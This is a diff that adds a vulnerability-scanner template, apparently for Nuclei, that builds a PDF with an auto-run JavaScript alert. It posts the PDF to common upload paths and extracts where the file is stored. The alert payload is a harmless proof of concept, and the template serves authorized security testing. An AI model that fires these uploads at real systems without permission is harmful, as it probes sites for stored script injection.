@@ -1,0 +1,107 @@
+id: medium-upload-pdf-javascript-execution
+
+info:
+  name: PDF JavaScript Execution - Elite Detection
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects PDF upload vulnerabilities where malicious PDFs containing JavaScript
+    can be executed when viewed, leading to potential XSS or client-side attacks.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types
+    - https://cwe.mitre.org/data/definitions/79.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-79
+  tags: upload,pdf,javascript,xss
+
+variables:
+  malicious_pdf: |
+    %PDF-1.4
+    1 0 obj
+    <<
+    /Type /Catalog
+    /Pages 2 0 R
+    /OpenAction 3 0 R
+    >>
+    endobj
+    2 0 obj
+    <<
+    /Type /Pages
+    /Kids [4 0 R]
+    /Count 1
+    >>
+    endobj
+    3 0 obj
+    <<
+    /Type /Action
+    /S /JavaScript
+    /JS (app.alert('XSS in PDF');)
+    >>
+    endobj
+    4 0 obj
+    <<
+    /Type /Page
+    /Parent 2 0 R
+    /MediaBox [0 0 612 792]
+    >>
+    endobj
+    xref
+    0 5
+    0000000000 65535 f 
+    0000000009 00000 n 
+    0000000074 00000 n 
+    0000000120 00000 n 
+    0000000179 00000 n 
+    trailer
+    <<
+    /Size 5
+    /Root 1 0 R
+    >>
+    startxref
+    238
+    %%EOF
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/upload.php"
+      - "{{BaseURL}}/document/upload"
+      - "{{BaseURL}}/files/upload"
+
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+
+    body: |
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="file"; filename="{{randstr}}.pdf"
+      Content-Type: application/pdf
+
+      {{malicious_pdf}}
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        condition: or
+        words:
+          - "upload successful"
+          - "file uploaded"
+          - "pdf uploaded"
+          - "document uploaded"
+
+    extractors:
+      - type: regex
+        name: pdf-path
+        part: body
+        regex:
+          - "(?i)(uploads?/[^\\s\"'<>]+\\.pdf)"
+          - "(?i)(files?/[^\\s\"'<>]+\\.pdf)"
